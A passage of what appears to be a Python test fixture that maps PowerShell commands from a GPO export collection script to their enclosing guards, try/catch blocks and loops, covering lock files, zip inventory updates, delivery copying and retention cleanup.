                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
            ),
        ),
        (
            "Join-Path $exportDir 'gpo-inventory.json'",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "Remove-Item -LiteralPath $newest.FullName -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "catch []",
            ),
        ),
        (
            "New-Item -ItemType Directory -Path $CopyTo -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
            ),
        ),
        (
            "Out-Null",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
            ),
        ),
        (
            "Join-Path $CopyTo $newest.Name",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
            ),
        ),
        (
            "Copy-Item -LiteralPath $newest.FullName -Destination $partial",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
                "try",
            ),
        ),
        (
            "Move-Item -LiteralPath $partial -Destination $delivery -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
                "try",
            ),
        ),
        (
            "Test-Path -LiteralPath $partial",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
                "finally",
                "if-condition after []",
            ),
        ),
        (
            "Remove-Item -LiteralPath $partial -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
                "finally",
                "if (Test-Path -LiteralPath $partial) after []",
            ),
        ),
        (
            'Write-GpoLensCollectionLog @logArgs -Message "ZIP delivered: $delivery"',
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
            ),
        ),
        (
            "Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
            ),
        ),
        (
            "Get-GpoLensCompletedExports -OutputRoot $OutputRoot",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            (
                "Where-Object { [string]::Equals($_.BaseName.Substring(0, $_.BaseName.Length - "
                "16), $producerPrefix, [StringComparison]::Ordinal) }"
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Select-Object -Skip $Retention",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Join-Path $OutputRoot $archive.BaseName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "foreach ($archive in $expired)",
            ),
        ),
        (
            "Assert-GpoLensRegularTree -Root $folder",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "foreach ($archive in $expired)",
            ),
        ),
        (
            "Remove-Item -LiteralPath $archive.FullName -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "foreach ($archive in $expired)",
                "guard Assert-GpoLensRegularTree -Root $folder",
            ),
        ),
        (
            "Remove-Item -LiteralPath $folder -Recurse -Force",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "foreach ($archive in $expired)",
                "guard Assert-GpoLensRegularTree -Root $folder",
            ),
        ),
        (
            (
                'Write-GpoLensCollectionLog @logArgs -Message "Collection succeeded: '
                '$($newest.Name); retained at most $Retention exports"'
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            'Write-Host "Collection succeeded: $($newest.FullName)"',
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            (
                'Write-GpoLensCollectionLog @logArgs -Message "Collection failed: '
                '$($failure.Exception.Message)"'
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "catch []",
                "try",
            ),
        ),
        (
            "Write-Warning 'Unable to write collection failure log.'",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "catch []",
                "catch []",
            ),
        ),
        (
            (
                "Invoke-GpoLensCollection -OutputRoot $OutputRoot -CollectorPath "
                "$CollectorPath ` -TaskName $TaskName ` -Retention $Retention -CopyTo $CopyTo "
                "-InventoryPath $InventoryPath ` -LogMaxBytes $LogMaxBytes -LogFiles $LogFiles"
            ),
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "try",
                "guard if (-not $OutputRoot) -> throw",
            ),
        ),
        (
            'Write-Error "Collection failed: $($_.Exception.Message)" -ErrorAction Continue',
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "catch []",
            ),
        ),
        (
            "[Text.UTF8Encoding]::new($false)",
            ("function Write-GpoLensCollectionLog",),
        ),
        (
            "[math]::Max(1, [int]($LogMaxBytes / 4) - 40)",
            ("function Write-GpoLensCollectionLog",),
        ),
        (
            "$line.Substring(0, $maxChars)",
            (
                "function Write-GpoLensCollectionLog",
                "if ($line.Length -gt $maxChars) after []",
            ),
        ),
        (
            "$encoding.GetByteCount($line)",
            ("function Write-GpoLensCollectionLog",),
        ),
        (
            "[IO.File]::AppendAllText($LogPath, $line, $encoding)",
            ("function Write-GpoLensCollectionLog",),
        ),
        (
            "$_.BaseName.Substring($_.BaseName.Length - 15)",
            (
                "function Get-GpoLensCompletedExports",
                "scriptblock in CommandExpressionAst",
            ),
        ),
        (
            "[IO.Compression.ZipFile]::OpenRead($archive.FullName)",
            (
                "function Get-GpoLensCompletedExports",
                "foreach ($archive in $candidates)",
                "try",
            ),
        ),
        (
            "$zip.GetEntry('AllGPOs.xml')",
            (
                "function Get-GpoLensCompletedExports",
                "foreach ($archive in $candidates)",
                "try",
                "if-condition after []",
            ),
        ),
        (
            "$zip.Dispose()",
            (
                "function Get-GpoLensCompletedExports",
                "foreach ($archive in $candidates)",
                "finally",
                "if ($zip) after []",
            ),
        ),
        (
            "[Collections.Generic.Stack[string]]::new()",
            ("function Assert-GpoLensRegularTree",),
        ),
        (
            "$pending.Push($Root)",
            ("function Assert-GpoLensRegularTree",),
        ),
        (
            "$pending.Pop()",
            (
                "function Assert-GpoLensRegularTree",
                "While ($pending.Count -gt 0)",
            ),
        ),
        (
            "$pending.Push($child.FullName)",
            (
                "function Assert-GpoLensRegularTree",
                "While ($pending.Count -gt 0)",
                "guard if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
                "foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force))",
                "guard if ($child.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
                "if ($child.PSIsContainer) after []",
            ),
        ),
        (
            (
                "[Text.Encoding]::UTF8.GetString($bytes).TrimStart([char]0xFEFF).TrimEnd([char["
                ']]"`r`n")'
            ),
            (
                "function Assert-GpoLensCollectionOwner",
                "guard if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) -> throw",
            ),
        ),
        (
            "[Text.Encoding]::UTF8.GetString($bytes).TrimStart([char]0xFEFF)",
            (
                "function Assert-GpoLensCollectionOwner",
                "guard if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) -> throw",
            ),
        ),
        (
            "[Text.Encoding]::UTF8.GetString($bytes)",
            (
                "function Assert-GpoLensCollectionOwner",
                "guard if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) -> throw",
            ),
        ),
        (
            "[string]::Equals($owner, $TaskName, [StringComparison]::OrdinalIgnoreCase)",
            (
                "function Assert-GpoLensCollectionOwner",
                "guard if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) -> throw",
                "if-condition after []",
            ),
        ),
        (
            (
                "[IO.File]::Open((Join-Path $OutputRoot 'collection.lock'), "
                "[IO.FileMode]::OpenOrCreate, [IO.FileAccess]::ReadWrite, [IO.FileShare]::None)"
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "[IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $InventoryPath).ProviderPath)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "[Text.Encoding]::UTF8.GetString($inventoryBytes).TrimStart([char]0xFEFF)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "[Text.Encoding]::UTF8.GetString($inventoryBytes)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "[Collections.Generic.HashSet[guid]]::new()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
                "guard if (-not $inventory) -> throw",
            ),
        ),
        (
            "[guid]::TryParse([string]$entry.Id, [ref]$id)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
                "guard if (-not $inventory) -> throw",
                "foreach ($entry in @($inventory))",
                "if-condition after []",
            ),
        ),
        (
            "$ids.Add($id)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
                "guard if (-not $inventory) -> throw",
                "foreach ($entry in @($inventory))",
                (
                    "guard if (-not [guid]::TryParse([string]$entry.Id, [ref]$id) -or $id -eq "
                    "[guid]::Empty) -> throw"
                ),
                "if-condition after []",
            ),
        ),
        (
            "($_ | Out-String).TrimEnd()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            "$previous.ContainsKey($_.FullName)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "[IO.Compression.ZipFile]::Open($newest.FullName, 'Update')",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
            ),
        ),
        (
            "$zip.GetEntry('AllGPOs.xml')",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "if-condition after []",
            ),
        ),
        (
            (
                "[IO.File]::WriteAllBytes((Join-Path $exportDir 'gpo-inventory.json'), "
                "$inventoryBytes)"
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "$zip.GetEntry('gpo-inventory.json')",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "$entry.Delete()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
                "if ($entry) after []",
            ),
        ),
        (
            "$zip.CreateEntry('gpo-inventory.json')",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "$entry.Open()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "$stream.Write($inventoryBytes, 0, $inventoryBytes.Length)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
                "try",
            ),
        ),
        (
            "$stream.Dispose()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
                "finally",
            ),
        ),
        (
            "$zip.Dispose()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "catch []",
                "if ($zip) after []",
            ),
        ),
        (
            "$zip.Dispose()",
            (
